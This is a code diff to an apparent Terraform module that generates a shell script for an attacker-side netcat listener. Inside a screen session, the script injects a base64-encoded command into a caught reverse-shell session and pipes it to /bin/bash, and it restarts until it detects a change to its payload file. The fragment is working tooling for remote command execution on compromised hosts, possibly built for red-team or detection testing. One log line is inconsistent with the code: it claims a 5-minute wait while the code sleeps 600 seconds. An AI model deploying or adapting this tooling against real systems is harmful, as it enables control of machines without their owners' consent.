@@ -3,7 +3,7 @@ locals {
     listen_ip = var.inputs["listen_ip"]
     base64_command_payload = base64encode(var.inputs["payload"])
     payload = <<-EOT
-    log "listener: ${local.listen_ip}:${local.listen_port}"
+    START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
     while true; do
         screen -S netcat -X quit
         truncate -s 0 /tmp/netcat.log
@@ -17,10 +17,17 @@ locals {
         sleep 30
         log 'sending screen command: ${var.inputs["payload"]}';
         screen -S netcat -p 0 -X stuff "echo '${local.base64_command_payload}' | base64 -d | /bin/bash -^M"
-        sleep 300
-        log "restarting attacker session..."
+        log "responder started..."
+        log 'waiting 5 minutes...';
+        sleep 600
+        CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
+        if [ "$CHECK_HASH" != "$START_HASH" ]; then
+            log "payload update detected - exiting loop"
+            break
+        else
+            log "restarting loop..."
+        fi
     done
-    log "done"
     EOT
     
     base64_payload = base64gzip(templatefile("${path.root}/modules/common/any/payload/linux/delayed_start.sh", { config = {
